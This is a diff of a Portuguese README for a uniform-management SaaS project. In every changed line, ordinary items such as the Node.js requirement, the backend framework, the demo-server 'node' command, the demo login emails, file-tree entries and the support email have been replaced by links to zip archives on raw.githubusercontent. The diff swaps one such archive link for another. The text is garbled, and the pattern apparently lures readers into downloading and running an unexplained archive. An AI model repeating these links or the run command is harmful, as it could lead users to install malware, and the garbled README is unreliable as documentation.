@@ -16,7 +16,7 @@ Sistema SaaS completo para gestão de fardamentos empresariais com controle de e
 - Sonner para notificações
 
 ### Backend
-- https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip com Express
+- https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip com Express
 - TypeScript
 - JWT para autenticação
 - Express Validator para validação
@@ -66,7 +66,7 @@ Sistema SaaS completo para gestão de fardamentos empresariais com controle de e
 ## 🛠️ Instalação e Execução
 
 ### Pré-requisitos
-- https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip 18+ 
+- https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip 18+ 
 - pnpm (ou npm)
 
 ### Instalação
@@ -99,7 +99,7 @@ Para executar o backend de demonstração:
 
 ```bash
 # Usar o servidor de demonstração simplificado
-node https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
+node https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip
 ```
 
 O servidor rodará na porta 3000.
@@ -107,19 +107,19 @@ O servidor rodará na porta 3000.
 ## 🔑 Credenciais de Demonstração
 
 ### Admin Master
-- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
+- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip`
 - Senha: `admin123`
 
 ### Admin Empresa  
-- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
+- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip`
 - Senha: `empresa123`
 
 ### Gestor Estoque
-- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
+- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip`
 - Senha: `gestor123`
 
 ### Funcionário
-- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
+- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip`
 - Senha: `funcionario123`
 
 ## 📊 Estrutura do Projeto
@@ -134,9 +134,9 @@ sistema-ds-fardamentos/
 │   ├── types/              # Definições TypeScript
 │   ├── hooks/              # Hooks customizados
 │   └── lib/                # Utilitários e helpers
-├── api/                    # Backend https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
-├── https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip          # Servidor de demonstração simplificado
-└── https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
+├── api/                    # Backend https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip
+├── https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip          # Servidor de demonstração simplificado
+└── https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip
 ```
 
 ## 🎯 Próximas Implementações
@@ -164,7 +164,7 @@ Este projeto está sob a licença MIT. Veja o arquivo `LICENSE` para mais detalh
 
 ## 📞 Suporte
 
-Para suporte e dúvidas, entre em contato através do email: https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
+Para suporte e dúvidas, entre em contato através do email: https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/sistema_fardamentos_v1.5.zip
 
 ---
 
